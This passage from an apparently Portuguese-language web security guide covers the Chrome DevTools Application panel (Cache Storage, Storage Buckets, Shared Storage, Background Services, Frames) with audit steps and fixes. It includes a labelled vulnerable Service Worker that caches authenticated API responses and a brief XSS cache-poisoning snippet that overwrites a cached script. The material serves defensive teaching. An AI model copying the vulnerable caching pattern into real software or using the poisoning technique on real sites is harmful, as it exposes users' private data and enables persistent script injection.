-----------------------------+---------------+--------------------------+----------------+---------------------
/assets/main.a1b2c3.js       | basic         | application/javascript   | 142500         | 10/30/2026, 09:15:00
/assets/logo.svg             | basic         | image/svg+xml            | 4120           | 10/30/2026, 09:15:01
/api/v1/meu-perfil           | basic         | application/json         | 890            | 10/30/2026, 09:16:22  <-- [RISCO!]
```

- **Comportamento normal**: contém apenas ativos estáticos públicos (`.js`, `.css`, `.woff2`, `.png`, `.svg`, shell HTML genérico sem dados do usuário).
- **O que seria considerado seguro**:
  - **[REQUISITO]** Armazenar no *Cache Storage* exclusivamente recursos estáticos públicos ou dados não sensíveis.
  - **[REQUISITO]** Garantir que o *Cache Storage* **não ignore** a semântica de privacidade quando o *Service Worker* é programado (lembre-se: `cache.put(req, res)` grava no *Cache Storage* **mesmo que a resposta do servidor contenha `Cache-Control: no-store`**, pois a *Cache API* obedece ao comando explícito do JavaScript!).
- **O que poderia indicar uma vulnerabilidade**:
  - **Cache Indevido de Respostas Autenticadas / PII**: um desenvolvedor escreve um *Service Worker* genérico que intercepta **todas** as requisições `GET` (`event.request.method === 'GET'`) e faz `cache.put(event.request, response.clone())` indiscriminadamente. Como resultado, chamadas como `GET /api/v1/meu-perfil`, `GET /api/v1/extrato-bancario` ou `GET /api/v1/token-renovacao` ficam salvas permanentemente em texto claro dentro do **Cache Storage**!
  - **Acesso Indevido pós-Logout em Computador Compartilhado**: como o *Cache Storage* persiste em disco e **qualquer script da página principal** também pode lê-lo diretamente via `await caches.match('/api/v1/meu-perfil')` (não é exclusivo do *Service Worker*), se a aplicação não apagar o *Cache Storage* no *logout*, o próximo usuário que sentar no computador (ou um script XSS) pode abrir o DevTools em **Application → Cache storage** e ler todo o extrato bancário e dados pessoais do usuário anterior!
  - **Envenenamento do Cache Storage (*Client-Side Cache Poisoning*)**: se houver XSS na aplicação, o script invasor pode usar `caches.open('loja-static-v1')` e sobrescrever a entrada `/assets/main.js` dentro do *Cache Storage* com um script malicioso (`new Response('alert(1)', { headers: {'Content-Type': 'application/javascript'} })`), alcançando **persistência local** mesmo sem registrar um novo *Service Worker*!
  - **Exaustão de Cota com Respostas Opacas (*Opaque Responses*)**: respostas `Response-Type: opaque` (obtidas de origens cruzadas sem CORS, `mode: 'no-cors'`) têm seu status e tamanho reais ocultados por segurança (`status: 0`), mas o Chrome contabiliza um *padding* mínimo de vários megabytes (ex.: ~7 MB por resposta opaca) na cota de armazenamento para evitar ataques de canal lateral (*XS-Leaks* de tamanho de arquivo), podendo esgotar rapidamente a cota do site.
- **Como investigar o problema**:
  1. Faça login na aplicação, navegue pelas telas que exibem dados privados (perfil, faturas, mensagens).
  2. Abra **Application → Storage → Cache storage** e expanda todos os caches listados.
  3. Clique em cada entrada cujo **Content-Type** seja `application/json` ou `text/html` e examine a aba **Preview** / **Response** na parte inferior do painel para verificar se há dados pessoais ou tokens gravados.
  4. Faça *logout* e clique no botão **Refresh** do *Cache Storage* para conferir se os dados permanecem lá.
- **Como corrigir ou prevenir**:

**Exemplo de código de Service Worker Vulnerável vs. Corrigido:**

```javascript
// ============================================================================
// [INSEGURO / VULNERÁVEL] Service Worker que cacheia tudo indiscriminadamente
// ============================================================================
self.addEventListener('fetch', (event) => {
  // ERRO GRAVE: intercepta inclusive /api/meu-perfil e /api/extrato e grava no Cache Storage!
  event.respondWith(
    caches.open('app-cache-v1').then(async (cache) => {
      const cached = await cache.match(event.request);
      if (cached) return cached;
      const response = await fetch(event.request);
      cache.put(event.request, response.clone()); // Ignora Cache-Control: no-store!
      return response;
    })
  );
});
```

```javascript
// ============================================================================
// [SEGURO / CORRIGIDO] Lista de permissão (Allowlist) estrita para ativos estáticos
// ============================================================================
const CACHE_NAME = 'loja-static-v2';
const STATIC_PREFIXES = ['/assets/', '/fonts/', '/images/'];

self.addEventListener('fetch', (event) => {
  const url = new URL(event.request.url);

  // 1. [REQUISITO] Nunca interceptar métodos diferentes de GET ou outras origens
  if (event.request.method !== 'GET' || url.origin !== self.location.origin) {
    return;
  }

  // 2. [REQUISITO] Nunca cachear rotas de API (/api/*) ou páginas autenticadas
  const isStaticAsset = STATIC_PREFIXES.some((prefix) => url.pathname.startsWith(prefix));
  if (!isStaticAsset) {
    return; // Vai direto para a rede (Network Only)
  }

  event.respondWith(
    caches.open(CACHE_NAME).then(async (cache) => {
      const cached = await cache.match(event.request);
      if (cached) return cached;

      const response = await fetch(event.request);
      // 3. [BOA PRÁTICA] Respeitar status 200 e verificar se não há Cache-Control: no-store
      const cacheControl = response.headers.get('Cache-Control') || '';
      if (response.status === 200 && !cacheControl.includes('no-store')) {
        await cache.put(event.request, response.clone());
      }
      return response;
    })
  );
});
```

---

<a id="s2-2-8"></a>
#### 2.2.8 Demais recursos da aba Application

Além dos mecanismos clássicos de armazenamento e *Service Workers*, o painel **Application** do Chrome DevTools inclui ferramentas avançadas para inspecionar novas APIs de gerenciamento de armazenamento, iniciativas de privacidade, serviços assíncronos em segundo plano e o isolamento de segurança de quadros (*Frames*).

##### Storage Buckets

- **Nome do parâmetro**: **Storage Buckets** (**[Varia por versão]** — Inspetor da *Storage Buckets API*).
- **O que significa**: tradicionalmente, todo o armazenamento de uma origem (`IndexedDB` e `Cache Storage`) ficava em um único "balde" padrão (*default bucket*). Quando o disco do dispositivo do usuário enchia, o navegador precisava apagar tudo daquela origem de uma vez só (*all-or-nothing eviction*). A **Storage Buckets API** (`navigator.storageBuckets.open('nome-do-balde')`) permite que uma aplicação crie múltiplos **baldes independentes** (ex.: um balde `rascunhos-email-criticos` com `persisted: true` e um balde `anexos-cache-temporario` com cota menor e data de expiração `expires`), cada um contendo seu próprio `IndexedDB` e `Cache Storage`.
- **Para que serve**: inspecionar, na árvore do grupo **Storage**, cada *Storage Bucket* criado pela origem, visualizando seus metadados (**Bucket name**, **Persisted**, **Quota**, **Expiration**) e expandindo o `IndexedDB` e o `Cache Storage` específicos daquele balde.
- **Onde encontrar no DevTools**: aba **Application** → barra lateral esquerda → grupo **Storage** → **Storage buckets** **[Varia por versão]**.
- **Exemplo prático**: um webmail cria o balde `mensagens_enviadas_offline` (com alta prioridade) e `miniaturas_imagens` (com expiração de 7 dias).
- **Comportamento normal**: só exibe subitens quando a página invoca explicitamente a API `navigator.storageBuckets.open()`.
- **O que seria considerado seguro**: aplicar expiração automática (`expires`) nos baldes e limpá-los com `navigator.storageBuckets.delete('nome')` durante o *logout* **[REQUISITO]**.
- **O que poderia indicar uma vulnerabilidade**: esconder dados confidenciais em um *Storage Bucket* secundário e esquecer de apagá-lo no *logout* (limpando apenas o `indexedDB` do balde padrão).
- **Como investigar o problema**: durante uma auditoria, verifique se a seção **Storage buckets** possui baldes criados além do armazenamento padrão e expanda cada um deles.
- **Como corrigir ou prevenir**: usar o cabeçalho HTTP `Clear-Site-Data: "storage", "cache"` no *logout*, que limpa todos os baldes da origem simultaneamente **[RECOMENDAÇÃO]**.

##### Shared Storage e Private State Tokens

- **Nome do parâmetro**: **Shared Storage** e **Private State Tokens** (**[Varia por versão]** — Recursos de armazenamento e antifraude ligados ao *Privacy Sandbox*).
- **O que significa**:
  - **Shared Storage**: armazenamento chave-valor não particionado que pode ser gravado em contextos entre sites (*cross-site*), mas cuja **leitura direta pelo JavaScript da página é proibida**. Os dados só podem ser lidos dentro de um ambiente de execução altamente restrito chamado *Shared Storage Worklet*, que só permite saídas agregadas ou seleção de URL renderizada em `<fencedframe>` (para testes A/B, rotação de criativos publicitários ou medição de alcance sem vazar a identidade do usuário entre sites).
  - **Private State Tokens** (anteriormente chamado de *Trust Tokens*): API que permite que um site onde o usuário é conhecido e autenticado (o *Issuer* — Emissor) emita tokens criptográficos assinados às cegas (*blind signatures*). Mais tarde, outro site (o *Redeemer*) pode verificar um token para ter certeza de que o visitante é um humano real (e não um bot automatizado), **sem que os dois sites consigam vincular a identidade individual do usuário**.
- **Para que serve**:
  - Em **Shared storage**: visualizar os eventos de acesso (`document.sharedStorage.set`, `append`, `delete`, `clear`, `run`, `selectURL`) e inspecionar os pares chave-valor armazenados por cada origem durante a depuração no DevTools.
  - Em **Private state tokens**: visualizar os tokens disponíveis por emissor (*Issuer*), a quantidade de tokens restantes e o estado das operações de emissão (*Issuance*) e resgate (*Redemption*).
- **Onde encontrar no DevTools**: aba **Application** → barra lateral esquerda → grupo **Storage** → **Shared storage** e **Private state tokens** **[Varia por versão]** (a disponibilidade e o comportamento dessas APIs variam conforme as decisões de arquitetura de privacidade do Chrome e configurações do navegador).
- **Exemplo prático**: um portal de conteúdo usa `window.sharedStorage.set('artigos_lidos_mes', '3')` para controlar limite de artigos gratuitos via *Worklet*; o par aparece listado em **Application → Shared storage → `https://portal.test`**.
- **Comportamento normal**: permanece vazio na maioria das aplicações corporativas tradicionais; povoado em portais de mídia, provedores de CAPTCHA/antifraude e plataformas de publicidade.
- **O que seria considerado seguro**: jamais armazenar credenciais ou PII em `Shared Storage` **[REQUISITO]**.
- **O que poderia indicar uma vulnerabilidade**: tentativa de armazenar tokens de sessão ou dados confidenciais em `Shared Storage` ou abuso de chamadas para esgotamento de orçamento de entropia (*entropy budget*).
- **Como investigar o problema**: clique em **Shared storage** e **Private state tokens** na barra lateral do grupo **Storage** para listar origens que utilizaram essas APIs durante o carregamento da página.
- **Como corrigir ou prevenir**: utilizar essas APIs estritamente para os casos de uso agregados e antifraude previstos na especificação **[BOA PRÁTICA]**.

##### Background Services

- **Nome do parâmetro**: **Background Services** (Monitor de serviços em segundo plano, *Back/forward cache* e *Speculative loads*).
- **O que significa**: grupo da barra lateral da aba **Application** dedicado a diagnosticar APIs do navegador que operam de forma assíncrona, fora do fluxo imediato da página ou durante transições de navegação. Inclui:
  1. **Back/forward cache (`bfcache`)**: cache em memória do navegador que guarda um *snapshot* completo da página inteira (incluindo o heap JavaScript pausado e o DOM) quando o usuário navega para fora, permitindo restauração instantânea ao clicar nos botões **Voltar** ou **Avançar**. Possui o botão **Test back/forward cache** que identifica exatamente o que está impedindo o uso do `bfcache` (como `Cache-Control: no-store` ou conexões abertas).
  2. **Background fetch**: transferências grandes em segundo plano (ex.: download de episódios de podcast ou pacotes offline) que continuam mesmo se o usuário fechar a aba.
  3. **Background sync**: adia ações (como envio de uma mensagem de chat) até que o usuário recupere conexão de internet estável.
  4. **Notifications**: registra eventos de exibição, clique e fechamento de notificações web (*Web Notifications API*).
  5. **Payment handler**: monitora eventos da *Payment Handler API* em provedores de pagamento web.
  6. **Periodic background sync**: sincronizações periódicas em segundo plano para PWAs instaladas.
  7. **Push messaging**: monitora mensagens recebidas via protocolo *Web Push* (RFC 8030) pelo *Service Worker*.
  8. **Reporting API**: exibe relatórios gerados automaticamente pelo navegador (como violações de **CSP**, violações de **COOP/COEP**, *Deprecation reports* e *Intervention reports*) e mostra os endpoints configurados no cabeçalho HTTP `Reporting-Endpoints`.
  9. **Speculative loads** (agrupado em versões recentes dentro de *Background services*): inspeciona regras da **Speculation Rules API** (`<script type="speculationrules">`), mostrando quais URLs estão sendo pré-buscadas (*Prefetch*) ou pré-renderizadas em segundo plano (*Prerender*) e se foram usadas ou descartadas.
- **Para que serve**: gravar (por até 3 dias no DevTools ao clicar no botão **Record**, mesmo com o DevTools fechado!) os eventos de *Background Fetch*, *Sync*, *Notifications* e *Push*, auditar relatórios de segurança na **Reporting API**, testar o **Back/forward cache** e depurar pré-carregamentos especulativos.
- **Onde encontrar no DevTools**: aba **Application** → barra lateral esquerda → grupo **Background services**.
- **Exemplo prático**:
  - **Auditoria de Segurança no `bfcache`**: se um usuário faz *logout* em um sistema bancário e a próxima pessoa clica no botão **Voltar** do navegador, a tela anterior com o saldo bancário reaparece instantaneamente a partir do `bfcache`? Enviar `Cache-Control: no-store` na página autenticada faz o Chrome invalidar o `bfcache` em cenários sensíveis ou você pode tratar o evento `pageshow` (`if (event.persisted) window.location.reload()`).
  - **Auditoria na `Reporting API`**: ao configurar `Content-Security-Policy: ...; report-to csp-endpoint`, você abre **Application → Background services → Reporting API** e vê em uma tabela todas as violações de CSP enfileiradas (`Queued`) ou enviadas (`Sent`) pelo navegador!
- **Comportamento normal**: os painéis de eventos (*Push*, *Sync*, *Notifications*) só mostram registros após você clicar no botão redondo **Start recording events**; já **Back/forward cache**, **Reporting API** e **Speculative loads** refletem o estado da página atual.
- **O que seria considerado seguro**:
  - **[REQUISITO]** Garantir que páginas autenticadas com dados sensíveis enviem `Cache-Control: no-store` e limpem o estado no *logout*, evitando que o botão **Voltar** exiba dados de sessão encerrada via `bfcache`.
  - **[REQUISITO]** Em **Push messaging**, criptografar os payloads Web Push (RFC 8291) e nunca transmitir segredos reutilizáveis em notificações visíveis na tela de bloqueio do dispositivo.
  - **[REQUISITO]** Em **Speculative loads**, nunca permitir que regras de `prefetch` ou `prerender` acionem URLs que causem efeitos colaterais no servidor (como `/logout` ou `/excluir-item`).
- **O que poderia indicar uma vulnerabilidade**:
  - Página de internet banking restaurada integralmente pelo `bfcache` após o *logout* quando se clica no botão **Voltar**.
  - Uso abusivo de **Notifications** e **Push messaging** por sites maliciosos (golpes de *Notification Spam* fingindo ser alertas de antivírus do sistema operacional).
  - Dezenas de relatórios de violação de CSP ou COEP na **Reporting API** indicando tentativa ativa de injeção de script ou inclusão de recursos não autorizados.
- **Como investigar o problema**:
  1. Em **Application → Back/forward cache**, verifique como a página autenticada se comporta ao navegar e voltar após o *logout*.
  2. Em **Application → Reporting API**, inspecione a tabela de relatórios gerados e a seção *Endpoints*.
  3. Em **Application → Push messaging / Notifications**, ative a gravação (**Record**) para auditar quais mensagens um *Service Worker* está recebendo em segundo plano.
- **Como corrigir ou prevenir**: usar `Cache-Control: no-store` e `Clear-Site-Data: "cache"` em páginas confidenciais **[REQUISITO]**; validar o estado da sessão no evento `window.addEventListener('pageshow', ...)` **[BOA PRÁTICA]**; configurar `Reporting-Endpoints` para coletar telemetry de violações de CSP/COOP/COEP em produção **[BOA PRÁTICA]**.

##### Frames

- **Nome do parâmetro**: **Frames** (Inspetor da hierarquia de quadros, *Security & Isolation* e disponibilidade de APIs).
- **O que significa**: a seção final na base da barra lateral da aba **Application** apresenta a árvore completa de **contextos de navegação (*browsing contexts*)** da página atual: o quadro principal no topo (**`top`**) e todos os quadros filhos embutidos via `<iframe>`, além das subpastas de *Workers*, *Scripts*, *Stylesheets*, *Images* e documentos carregados dentro de cada frame. Ao clicar diretamente sobre um frame (como **`top`** ou um `<iframe>`), o DevTools exibe um painel de diagnóstico rico em informações de **segurança e isolamento de processo**:
  1. **Frame Details**: *URL*, *Origin*, *Owner Element* (link direto para a tag `<iframe>` na aba *Elements*) e *Ad Status* (se o Chrome identificou o iframe como anúncio publicitário).
  2. **Security & Isolation**:
     - **Secure Context**: informa (`Yes` / `No`) se o frame está em um contexto seguro (`window.isSecureContext`, exigido para APIs modernas como `crypto.subtle`, *Service Workers*, *Geolocation*, etc.) e explica o motivo.
     - **Cross-Origin Isolated**: informa (`Yes` / `No`) se a página atingiu o estado de isolamento entre origens (`self.crossOriginIsolated === true`), que isola o documento em um processo exclusivo do sistema operacional para mitigar ataques de canal lateral na CPU como **Spectre**.
     - **Cross-Origin Embedder Policy (COEP)**: mostra o valor ativo do cabeçalho COEP (ex.: `require-corp`, `credentialless` ou `None`).
     - **Cross-Origin Opener Policy (COOP)**: mostra o valor ativo do cabeçalho COOP (ex.: `same-origin`, `same-origin-allow-popups` ou `unsafe-none`).
  3. **API availability**: informa se recursos de alta precisão potencialmente perigosos para ataques de temporização (*timing attacks*), como **`SharedArrayBuffer`** e `performance.measureUserAgentSpecificMemory()`, estão habilitados ou bloqueados naquele frame.
- **Para que serve**: auditar todos os `<iframe>` presentes na página, verificar se um contexto é seguro (`isSecureContext`) e diagnosticar por que o isolamento entre origens (**COOP + COEP**, veja [Headers de Segurança](./05-headers-de-seguranca.md#s5)) funcionou ou falhou ao tentar usar `SharedArrayBuffer` / WebAssembly multi-thread.
- **Onde encontrar no DevTools**: aba **Application** → barra lateral esquerda (final da lista) → grupo **Frames** → clicar em **`top`** (ou em qualquer `<iframe>` listado abaixo dele).
- **Exemplo prático** (Como aparece ao selecionar o frame `top` de uma aplicação isolada no DevTools):

```text
Frame: top (https://loja-ficticia.test/)
------------------------------------------------------------------------
Document
  URL:                          https://loja-ficticia.test/checkout
  Origin:                       https://loja-ficticia.test

Security & Isolation
  Secure Context:               Yes
  Cross-Origin Isolated:        Yes
  Cross-Origin Embedder Policy: require-corp
  Cross-Origin Opener Policy:   same-origin

API availability
  SharedArrayBuffer:            Available, transferable
  Measure Memory:               Available
```

- **Comportamento normal**: páginas HTTPS padrão exibem `Secure Context: Yes` e `Cross-Origin Isolated: No` (a menos que enviem explicitamente `Cross-Origin-Opener-Policy: same-origin` **e** `Cross-Origin-Embedder-Policy: require-corp` ou `credentialless`).
- **O que seria considerado seguro**:
  - **[REQUISITO]** `Secure Context: Yes` em toda a aplicação e seus frames.
  - **[RECOMENDAÇÃO]** Definir `Cross-Origin-Opener-Policy: same-origin` (ou `same-origin-allow-popups`) para isolar a janela principal contra ataques cross-window via `window.opener` e *XS-Leaks*.
  - **[RECOMENDAÇÃO]** Em todos os elementos `<iframe>` que carregam conteúdo de terceiros não totalmente confiáveis, utilizar o atributo HTML **`sandbox`** com o mínimo de permissões necessárias (nunca combinar `allow-scripts` e `allow-same-origin` simultaneamente em um iframe que compartilhe a mesma origem da aplicação principal, pois isso permite que o script dentro do iframe remova o próprio atributo `sandbox`!).
- **O que poderia indicar uma vulnerabilidade**:
  - `Secure Context: No` (aplicação rodando sobre HTTP ou embutida dentro de um quadro pai HTTP inseguro, desativando APIs de criptografia `window.crypto.subtle`).
  - Presença de `<iframe>` desconhecidos na árvore **Frames** apontando para domínios suspeitos (forte indício de injeção de código / *Magecart* / *Clickjacking* ou comprometimento de scripts de terceiros).
  - `COOP: unsafe-none` em aplicações sensíveis que abrem links externos ou podem ser abertas via `window.open()` por sites de terceiros.
- **Como investigar o problema**:
  1. Role a barra lateral da aba **Application** até o fim (**Frames**).
  2. Clique em **`top`** e leia a seção **Security & Isolation**.
  3. Expanda todos os frames filhos (`<iframe>`), clique em cada um para verificar a **Origin** e clique no link **Owner Element** para inspecionar na aba **Elements** se o `<iframe>` possui os atributos `sandbox`, `allow` (*Permissions Policy*) e `referrerpolicy`.
- **Como corrigir ou prevenir**:
  - Servir toda a hierarquia de páginas exclusivamente sobre HTTPS **[REQUISITO]**.
  - Configurar os cabeçalhos HTTP de isolamento (veja [Headers de Segurança](./05-headers-de-seguranca.md#s5)) quando aplicável **[RECOMENDAÇÃO]**:

```http
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Resource-Policy: same-origin
```

  - Restringir iframes de terceiros com o atributo `sandbox` e controlar quem pode embutir a sua própria aplicação usando a diretiva **`frame-ancestors`** do `Content-Security-Policy` (e `X-Frame-Options: DENY` ou `SAMEORIGIN` para compatibilidade) **[REQUISITO]**.

---

---

> [⬅️ 2.1 Chrome DevTools — Aba Network](./02a-devtools-network.md) | [🏠 **Voltar ao Sumário Principal**](../README.md) | [2.3 Chrome DevTools — Aba Console ➡️](./02c-devtools-console.md)
